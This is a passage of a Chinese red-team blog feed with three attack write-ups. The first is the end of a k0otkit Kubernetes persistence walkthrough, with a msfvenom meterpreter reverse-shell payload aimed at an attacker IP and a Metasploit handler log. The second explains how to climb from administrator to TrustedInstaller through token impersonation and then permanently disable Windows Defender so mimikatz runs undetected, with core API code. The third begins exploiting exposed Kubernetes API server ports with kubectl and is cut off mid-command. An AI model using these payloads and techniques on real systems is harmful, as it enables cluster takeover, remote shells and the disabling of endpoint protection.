class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/k8s4/k15.png"></p><h2 id="K0otkit"><a href="#K0otkit" class="headerlink" title="K0otkit"></a>K0otkit</h2><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">技术细节查看：https:<span class="token operator">/</span><span class="token operator">/</span><span class="token function">mp</span><span class="token punctuation">.</span>weixin<span class="token punctuation">.</span>qq<span class="token punctuation">.</span>com<span class="token operator">/</span>s<span class="token operator">/</span>H48WNRRtlJil9uLt<span class="token operator">-</span>O9asw项目下载：https:<span class="token operator">/</span><span class="token operator">/</span>github<span class="token punctuation">.</span>com<span class="token operator">/</span>Metarget<span class="token operator">/</span>k0otkit下载并赋予项目文件权限，修改ip&amp;端口<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/k8s4/k16.png"></p><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">生成kootkit，并进步执行反弹shell监听┌──<span class="token punctuation">(</span>root💀yangsirrr<span class="token operator">-</span>github<span class="token operator">-</span>io<span class="token punctuation">)</span><span class="token operator">-</span><span class="token punctuation">[</span>~<span class="token operator">/</span>桌面<span class="token operator">/</span>k0otkit<span class="token operator">-</span>main<span class="token punctuation">]</span>└─<span class="token comment"># ./pre_exp.sh             </span><span class="token operator">+</span> ATTACKER_IP=192<span class="token punctuation">.</span>168<span class="token punctuation">.</span>3<span class="token punctuation">.</span>11<span class="token operator">+</span> ATTACKER_PORT=20227<span class="token operator">+</span> TEMP_MRT=mrt<span class="token operator">+</span> msfvenom <span class="token operator">-</span>p linux<span class="token operator">/</span>x86<span class="token operator">/</span>meterpreter<span class="token operator">/</span>reverse_tcp LPORT=20227 LHOST=192<span class="token punctuation">.</span>168<span class="token punctuation">.</span>3<span class="token punctuation">.</span>11 <span class="token operator">-</span>f elf <span class="token operator">-</span>o mrt<span class="token operator">++</span> base64 <span class="token operator">-</span>w 0<span class="token operator">++</span> tr <span class="token operator">-</span>d <span class="token string">'\n'</span><span class="token operator">++</span> xxd <span class="token operator">-</span>p mrt<span class="token operator">+</span> PAYLOAD=N2Y0NTRjNDYwMTAxMDEwMDAwMDAwMDAwMDAwMDAwMDAwMjAwMDMwMDAxMDAwMDAwNTQ4MDA0MDgzNDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAzNDAwMjAwMDAxMDAwMDAwMDAwMDAwMDAwMTAwMDAwMDAwMDAwMDAwMDA4MDA0MDgwMDgwMDQwOGNmMDAwMDAwNGEwMTAwMDAwNzAwMDAwMDAwMTAwMDAwNmEwYTVlMzFkYmY3ZTM1MzQzNTM2YTAyYjA2Njg5ZTFjZDgwOTc1YjY4YzBhODAzMGI2ODAyMDA0ZjAzODllMTZhNjY1ODUwNTE1Nzg5ZTE0M2NkODA4NWMwNzkxOTRlNzQzZDY4YTIwMDAwMDA1ODZhMDA2YTA1ODllMzMxYzljZDgwODVjMDc5YmRlYjI3YjIwN2I5MDAxMDAwMDA4OWUzYzFlYjBjYzFlMzBjYjA3ZGNkODA4NWMwNzgxMDViODllMTk5YjI2YWIwMDNjZDgwODVjMDc4MDJmZmUxYjgwMTAwMDAwMGJiMDEwMDAwMDBjZDgw<span class="token operator">+</span> sed s<span class="token operator">/</span>PAYLOAD_VALUE_BASE64<span class="token operator">/</span>N2Y0NTRjNDYwMTAxMDEwMDAwMDAwMDAwMDAwMDAwMDAwMjAwMDMwMDAxMDAwMDAwNTQ4MDA0MDgzNDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAzNDAwMjAwMDAxMDAwMDAwMDAwMDAwMDAwMTAwMDAwMDAwMDAwMDAwMDA4MDA0MDgwMDgwMDQwOGNmMDAwMDAwNGEwMTAwMDAwNzAwMDAwMDAwMTAwMDAwNmEwYTVlMzFkYmY3ZTM1MzQzNTM2YTAyYjA2Njg5ZTFjZDgwOTc1YjY4YzBhODAzMGI2ODAyMDA0ZjAzODllMTZhNjY1ODUwNTE1Nzg5ZTE0M2NkODA4NWMwNzkxOTRlNzQzZDY4YTIwMDAwMDA1ODZhMDA2YTA1ODllMzMxYzljZDgwODVjMDc5YmRlYjI3YjIwN2I5MDAxMDAwMDA4OWUzYzFlYjBjYzFlMzBjYjA3ZGNkODA4NWMwNzgxMDViODllMTk5YjI2YWIwMDNjZDgwODVjMDc4MDJmZmUxYjgwMTAwMDAwMGJiMDEwMDAwMDBjZDgw<span class="token operator">/</span>g k0otkit_template<span class="token punctuation">.</span>sh<span class="token operator">+</span> sed s<span class="token operator">/</span>PAYLOAD_VALUE_BASE64<span class="token operator">/</span>N2Y0NTRjNDYwMTAxMDEwMDAwMDAwMDAwMDAwMDAwMDAwMjAwMDMwMDAxMDAwMDAwNTQ4MDA0MDgzNDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAzNDAwMjAwMDAxMDAwMDAwMDAwMDAwMDAwMTAwMDAwMDAwMDAwMDAwMDA4MDA0MDgwMDgwMDQwOGNmMDAwMDAwNGEwMTAwMDAwNzAwMDAwMDAwMTAwMDAwNmEwYTVlMzFkYmY3ZTM1MzQzNTM2YTAyYjA2Njg5ZTFjZDgwOTc1YjY4YzBhODAzMGI2ODAyMDA0ZjAzODllMTZhNjY1ODUwNTE1Nzg5ZTE0M2NkODA4NWMwNzkxOTRlNzQzZDY4YTIwMDAwMDA1ODZhMDA2YTA1ODllMzMxYzljZDgwODVjMDc5YmRlYjI3YjIwN2I5MDAxMDAwMDA4OWUzYzFlYjBjYzFlMzBjYjA3ZGNkODA4NWMwNzgxMDViODllMTk5YjI2YWIwMDNjZDgwODVjMDc4MDJmZmUxYjgwMTAwMDAwMGJiMDEwMDAwMDBjZDgw<span class="token operator">/</span>g k0otkit_remote_template<span class="token punctuation">.</span>sh                                                                                                                                                                                              ┌──<span class="token punctuation">(</span>root💀yangsirrr<span class="token operator">-</span>github<span class="token operator">-</span>io<span class="token punctuation">)</span><span class="token operator">-</span><span class="token punctuation">[</span>~<span class="token operator">/</span>桌面<span class="token operator">/</span>k0otkit<span class="token operator">-</span>main<span class="token punctuation">]</span>└─<span class="token comment"># ./handle_multi_reverse_shell.sh </span><span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> <span class="token keyword">Using</span> configured payload generic<span class="token operator">/</span>shell_reverse_tcppayload => linux<span class="token operator">/</span>x86<span class="token operator">/</span>meterpreter<span class="token operator">/</span>reverse_tcpLHOST => 0<span class="token punctuation">.</span>0<span class="token punctuation">.</span>0<span class="token punctuation">.</span>0LPORT => 4444ExitOnSession => false<span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> Exploit running as background job 0<span class="token punctuation">.</span><span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> Exploit completed<span class="token punctuation">,</span> but no session was created<span class="token punctuation">.</span><span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> Started reverse TCP handler on 0<span class="token punctuation">.</span>0<span class="token punctuation">.</span>0<span class="token punctuation">.</span>0:4444 msf6 exploit<span class="token punctuation">(</span>multi<span class="token operator">/</span>handler<span class="token punctuation">)</span> > <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/k8s4/k17.png"></p><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">上传并执行在攻击机生成的k0otkit<span class="token punctuation">.</span>sh文件<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/k8s4/k18.png"></p><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">执行后效果如下，会在kube<span class="token operator">-</span>system下的kube<span class="token operator">-</span>proxy进行修改<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/k8s4/k19.png"></p><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">上线效果如下<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/k8s4/k20.png"></p>]]></content>
      
      
      <categories>
          
          <category> Learning record </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CloudSecurity </tag>
            
            <tag> Kubernetes </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>从TrustedInstaller到停止WindowsDefender</title>
      <link href="2022/03/26/cong-trustedinstaller-dao-ting-zhi-windowsdefender/"/>
      <url>2022/03/26/cong-trustedinstaller-dao-ting-zhi-windowsdefender/</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><pre class="line-numbers language-none"><code class="language-none">前一阵先在雷神众测上发了遍，正好有空再blog也再发下，原地址：https:&#x2F;&#x2F;mp.weixin.qq.com&#x2F;s&#x2F;wkjcmhEg3JDP7GUyB3gI_Awin10都自带了defender，查杀能力也都比较强，有时候可能木马或许不会被杀，但是工具依旧可能会被杀，那么可能就需要尝试看看能否关闭defender，此处尝试以高权限用户命令行进行关闭，前提需要本地管理员，以利用TrustedInstaller的权限对defender服务进行操作因为常规操作经过尝试后发现如下，无法通过服务或者进程来直接停止或关闭目标程序，此处考虑针对非图形化方向来尝试关闭defend<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/TrustedInstaller-WindowsDefender/w1.png"><br><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/TrustedInstaller-WindowsDefender/w2.png"></p><pre class="line-numbers language-none"><code class="language-none">实际利用前先简单补充下令牌、TrustedInstaller相关的知识点<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="令牌"><a href="#令牌" class="headerlink" title="令牌"></a>令牌</h2><pre class="line-numbers language-none"><code class="language-none">windows token又叫access token，是一个描述进程或者线程安全上下文的一个对象，不同的用户登录计算机后，都会生成一个access token，这个toekn在用户创建进程或者线程时候就会被不断拷贝，也就解释了A用户创建一个进程而该进程不会有B用户的权限，重点还是关注进程或线程，当他有足够的权限就可以实现模拟另个用户，这也就是令牌模拟，目标可以是复制或使用另个进程线程的令牌，此处是需要有足够的权限才能打开并使用更多说明：https:&#x2F;&#x2F;docs.microsoft.com&#x2F;zh-cn&#x2F;windows&#x2F;win32&#x2F;secauthz&#x2F;access-tokens?redirectedfrom&#x3D;MSDN实际使用过程中，通过模拟目标进程令牌token以实现开启新进程从而获得到更高权限，比如本地管理员针对些system进程，从而获取system权限，效果如下<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/TrustedInstaller-WindowsDefender/w3.png"></p><pre class="line-numbers language-none"><code class="language-none">除了winlogon.exe可以被拿来获取system进程，其他的也可以比如lsass<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/TrustedInstaller-WindowsDefender/w4.png"></p><h3 id="openprocess失败"><a href="#openprocess失败" class="headerlink" title="openprocess失败"></a>openprocess失败</h3><pre class="line-numbers language-none"><code class="language-none">尝试过程中发现，并不是所有的system进程都可以拿来利用，比如wininit.exe，openprocess时就出现失败，对比错误代码确认Access is denied，该问题后面可以解决<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/TrustedInstaller-WindowsDefender/w5.png"><br><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/TrustedInstaller-WindowsDefender/w6.png"></p><pre class="line-numbers language-none"><code class="language-none">查阅资料后进步比较利用成功的winlogon.exe和利用失败的wininit.exe<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/TrustedInstaller-WindowsDefender/w7.png"></p><pre class="line-numbers language-none"><code class="language-none">对比成功利用的lsass后可以确认与会话sessionid无关<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/TrustedInstaller-WindowsDefender/w8.png"></p><pre class="line-numbers language-none"><code class="language-none">进步查看acl相关配置，两者也近乎相同<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/TrustedInstaller-WindowsDefender/w9.png"></p><pre class="line-numbers language-none"><code class="language-none">过程中进程权限打开不动，于是乎尝试更换其他的失败进程对比看看是否有不同之处，后面继续尝试<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/TrustedInstaller-WindowsDefender/w10.png"></p><h3 id="openprocesstoken失败"><a href="#openprocesstoken失败" class="headerlink" title="openprocesstoken失败"></a>openprocesstoken失败</h3><pre class="line-numbers language-none"><code class="language-none">通过多次尝试，发现了openprocess成功，但openprocesstoken失败<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/TrustedInstaller-WindowsDefender/w11.png"></p><pre class="line-numbers language-none"><code class="language-none">尝试查看相关不同之处winlogon.exe、lsass.exe的用户都为system、但所有者都是administrators，同1632的这个svchost对比可发现所有者的区别所在<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/TrustedInstaller-WindowsDefender/w12.png"><br><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/TrustedInstaller-WindowsDefender/w13.png"></p><pre class="line-numbers language-none"><code class="language-none">github上正好有份可以拿来看token的ps1非常方便https:&#x2F;&#x2F;gist.githubusercontent.com&#x2F;vector-sec&#x2F;a049bf12da619d9af8f9c7dbd28d3b56&#x2F;raw&#x2F;eaddf4151ebe4345623b7066a2c768665805fcad&#x2F;Get-Token.ps1对比下进程可确认，机器中间重启过，此处换了个svchost<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/TrustedInstaller-WindowsDefender/w14.png"><br><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/TrustedInstaller-WindowsDefender/w15.png"></p><pre class="line-numbers language-none"><code class="language-none">username、ownername也就是用户、所有者，似乎就是成功利用system进程创建令牌的主要区别也就是为什么在openprocesstoken失败的原因，因为用户不是所有者，知道了这个特征那么可以再去找下其他可以拿来利用的system进程，如ChsIME.exe成功利用如下<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/TrustedInstaller-WindowsDefender/w16.png"></p><pre class="line-numbers language-none"><code class="language-none">因为在上图进程尝试的过程中也有部分OpenProcess出现同样的失败问题<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="再回openprocess"><a href="#再回openprocess" class="headerlink" title="再回openprocess"></a>再回openprocess</h3><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/TrustedInstaller-WindowsDefender/w17.png"></p><pre class="line-numbers language-none"><code class="language-none">对比进程后，发现了一个特征保护属性PsProtectedSignerWinTcb-Light关于PPL，简略介绍，在Windows 8.1&#x2F; Server 2012 R2 开始引入这个概念的，而PPL实际上是对之前Protected Process模型的扩展，增加了“Protection level”的概念，基本上就是说一些PP(L)进程可以比其他进程受到更多的保护<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/TrustedInstaller-WindowsDefender/w18.png"></p><pre class="line-numbers language-none"><code class="language-none">此时是需要修改openprocess的安全描述符从原先的PROCESS_QUERY_INFORMATION为PROCESS_QUERY_LIMITED_INFORMATION，从而能够实现在我们的进程上openprocess，最终效果如下，以此可以成功获得到system权限<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/TrustedInstaller-WindowsDefender/w19.png"></p><pre class="line-numbers language-none"><code class="language-none">重点代码HANDLE processHandle &#x3D; OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, true, PID_TO_IMPERSONATE);&#x2F;&#x2F; 进程令牌获取OpenProcessTokenif (!OpenProcessToken(processHandle, TOKEN_DUPLICATE | TOKEN_ASSIGN_PRIMARY | TOKEN_QUERY, &amp;OpenProcessTokenHandle)) &#123;&#x2F;&#x2F; 用的是OpenProcessToken的返回句柄，当前线程模拟另一个用户if (!ImpersonateLoggedOnUser(OpenProcessTokenHandle)) &#123; &#x2F;&#x2F;https:&#x2F;&#x2F;docs.microsoft.com&#x2F;en-us&#x2F;windows&#x2F;win32&#x2F;api&#x2F;securitybaseapi&#x2F;nf-securitybaseapi-impersonateloggedonuser&#x2F;&#x2F; 用的也是OpenProcessToken令牌if (!DuplicateTokenEx(OpenProcessTokenHandle, TOKEN_ALL_ACCESS, NULL, SecurityImpersonation, TokenPrimary, &amp;duplicateTokenHandle)) &#123;&#x2F;&#x2F; 创建目标进程if (!(CreateProcessWithTokenW(duplicateTokenHandle, LOGON_WITH_PROFILE, &quot;XXXXXXX&quot;, NULL, 0, NULL, NULL, &amp;startupInfo, &amp;processInformation))) &#123;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="TrustedInstaller"><a href="#TrustedInstaller" class="headerlink" title="TrustedInstaller"></a>TrustedInstaller</h2><pre class="line-numbers language-none"><code class="language-none">在Windows中拥有修改系统文件权限，本身是一个服务，以一个账户组的形式出现：NT SERVICE\TrustedInstallerTrustedInstaller为Windows系统中众多系统内置安全主体中的一个，除了组之外也是系统重要服务，用户无法直接在此服务的上下文中运行程序或另一个服务。它是操作系统上用来对系统进行维护、更新等操作的组。SID是S-1-5-80-956008885-3418522649-1831038044-1853292631-2271478464。TrustedInstaller权限的意义是用来防止程序或用户无意或恶意破坏系统文件。这个安全主体本身是一个服务，名称为：Windows Modules Installer各类百科文档说的更详细，此处就简单补充<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/TrustedInstaller-WindowsDefender/w20.png"></p><pre class="line-numbers language-none"><code class="language-none">一般常规情况下，进程默认打开未启动，需要先启动下服务才能启动那么也就意味着要获得到TrustedInstaller的权限，需要先通过服务启动下<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/TrustedInstaller-WindowsDefender/w21.png"></p><pre class="line-numbers language-none"><code class="language-none">了解下权限划分即可知道，在windows下TrustedInstaller权限其实超过了system，再回到为什么没法直接关闭WinDefend，查看WinDefend服务的dcal，可以发现管理员、system只有start的权限没法进行stop<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/TrustedInstaller-WindowsDefender/w22.png"><br><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/TrustedInstaller-WindowsDefender/w23.png"><br><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/TrustedInstaller-WindowsDefender/w24.png"></p><pre class="line-numbers language-none"><code class="language-none">但服务本身和TrustedInstaller具备完全控制，可以实现stop功能<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/TrustedInstaller-WindowsDefender/w25.png"></p><h2 id="尝试利用"><a href="#尝试利用" class="headerlink" title="尝试利用"></a>尝试利用</h2><pre class="line-numbers language-none"><code class="language-none">当前管理员，首先利用winlogon获得system权限，再获取到WinDefend权限，此处通过MsMpEng.exe进行令牌模拟，结合PROCESS_QUERY_LIMITED_INFORMATION即可，但经过测试发现因为一些原因后续依旧无法进行windefend的停止<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/TrustedInstaller-WindowsDefender/w26.png"><br><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/TrustedInstaller-WindowsDefender/w27.png"></p><pre class="line-numbers language-none"><code class="language-none">更换思路，依旧从管理员到system出发，利用winlogon获得system权限，通过StartService启动trustedinstaller服务，从而进步获取trustedinstaller的权限，利用trustedinstaller来停止defender<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/TrustedInstaller-WindowsDefender/w28.png"></p><pre class="line-numbers language-none"><code class="language-none">利用当前权限通过服务以进行windefend的关闭，效果如下，机器重启后可恢复defender，或者手动点重启也可以<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/TrustedInstaller-WindowsDefender/w29.png"></p><pre class="line-numbers language-none"><code class="language-none">那么问题来了，是否有办法来达到无法恢复defender的目的？查找资料后，发现进步通过ChangeServiceConfig2W可以来删除原有的PsProtectSignerAntimalware-Light保护，进步结合可以尝试删除、修改defender的相关组件，以导致无法进步正常重启运行，因为现有的停止服务是可以进行重启来恢复的主要用到的代码if (!QueryServiceConfig2W(hService, SERVICE_CONFIG_LAUNCH_PROTECTED, LPBYTE(&amp;srvinfo), sizeof(SERVICE_LAUNCH_PROTECTED_INFO), &amp;cbBufSize)) if (!ChangeServiceConfig2W(hService, SERVICE_CONFIG_LAUNCH_PROTECTED, &amp;dwLaunchProtected)) &#123;    对比效果如下<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/TrustedInstaller-WindowsDefender/w30.png"><br><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/TrustedInstaller-WindowsDefender/w31.png"></p><pre class="line-numbers language-none"><code class="language-none">此处以mimikatz为示例，原mimikatz默认被杀<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/TrustedInstaller-WindowsDefender/w32.png"></p><pre class="line-numbers language-none"><code class="language-none">删除相关部分defender组件，导致defender无法重启使用，组件文件可以自己动手尝试，暂时就不放了，测试后电脑重启后依旧无法启动，具有一定破坏性..<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/TrustedInstaller-WindowsDefender/w33.png"></p>]]></content>
      
      
      <categories>
          
          <category> Tips </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Redteam </tag>
            
            <tag> Bypass </tag>
            
            <tag> WindowsDefender </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Kubernetes组件常见漏洞利用</title>
      <link href="2022/03/25/kubernetes-zu-jian-chang-jian-lou-dong-li-yong/"/>
      <url>2022/03/25/kubernetes-zu-jian-chang-jian-lou-dong-li-yong/</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><pre class="line-numbers language-none"><code class="language-none">Kubernetes大致结构如下，主要集群由master、node组成，master主要进行各种管理，node提供部署环境简介：apiserver：操作各项资源，如部署应用等scheduler：按照设定的调度策略，将pod安装到指定的node上etcd：存放集群信息，包含master、nodes等controller manager：集群控制，管控相关nodekubelet：接收到请求，操作集群中的容器详情见官方文档：https:&#x2F;&#x2F;kubernetes.io&#x2F;zh&#x2F;docs&#x2F;concepts&#x2F;overview&#x2F;components&#x2F;# kube-apiserver<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/k8s3/k1.png"></p><h2 id="组件接口风险"><a href="#组件接口风险" class="headerlink" title="组件接口风险"></a>组件接口风险</h2><pre class="line-numbers language-none"><code class="language-none">Kubernetes使用的组件非常多，大多数以HTTP、HTTPS的API形式提供服务，常用的服务和端口如下APIserver  6443：基于HTTPS的安全端口APIserver  8080：不安全的HTTP端口Kubelet  10248：用于检查Kubelet状态的HTTP端口Kubelet  10250：面向APIserver提供服务的HTTPS端口Dashboard  30000以上：提供HTTP服务的端口etcd  2379：客户端和服务端之间通信的端口etcd  2380：不同服务端之间通信的端口<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="apiserver"><a href="#apiserver" class="headerlink" title="apiserver"></a>apiserver</h3><pre class="line-numbers language-none"><code class="language-none">默认情况下APIserver只在8080、6443两个端口提供服务，8080端口提供没有TLS加密的HTTP服务，所有到达该端口的请求将绕过所有认证和授权模块，保留该端口是为了方便测试和集群初启动在生产环境开放8080端口，也是非常危险，如果暴露在公网，那么任何网络可达的攻击者都能够通过该端口直接和APIserver交互，继而控制集群对比下6443提供了TLS加密的HTTPS服务，到达的请求必须通过认证和授权机制才能被处理，认证和授权机制下，6443端口的服务安全性将更高<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="实际利用"><a href="#实际利用" class="headerlink" title="实际利用"></a>实际利用</h4><h5 id="8080端口"><a href="#8080端口" class="headerlink" title="8080端口"></a>8080端口</h5><pre class="line-numbers language-none"><code class="language-none">直接访问后页面如下http:&#x2F;&#x2F;192.168.3.19:8080&#x2F;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/k8s3/k2.png"></p><pre class="line-numbers language-none"><code class="language-none">结合kubectl远程获取目标已经存在的pod列表kubectl  -s 192.168.3.19:8080  get pods<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/k8s3/k3.png"></p><pre class="line-numbers language-none"><code class="language-none">远程交互shell<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/k8s3/k4.png"></p><h5 id="6443端口"><a href="#6443端口" class="headerlink" title="6443端口"></a>6443端口</h5><pre class="line-numbers language-none"><code class="language-none">尝试寻找各类token，如kube-system命名空间、admin用户、其他各类自建或默认账户等正常访问其实获取不到东西，各类token都没<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/k8s3/k5.png"></p><pre class="line-numbers language-none"><code class="language-none">修改基本配置文件后，再度访问，部分token等信息如下<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/k8s3/k6.png"><br><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/k8s3/k7.png"></p><pre class="line-numbers language-none"><code class="language-none">结合收集到的token进步利用kubectl --kubeconfig&#x3D;.&#x2F;test_config config set-credentials hacker 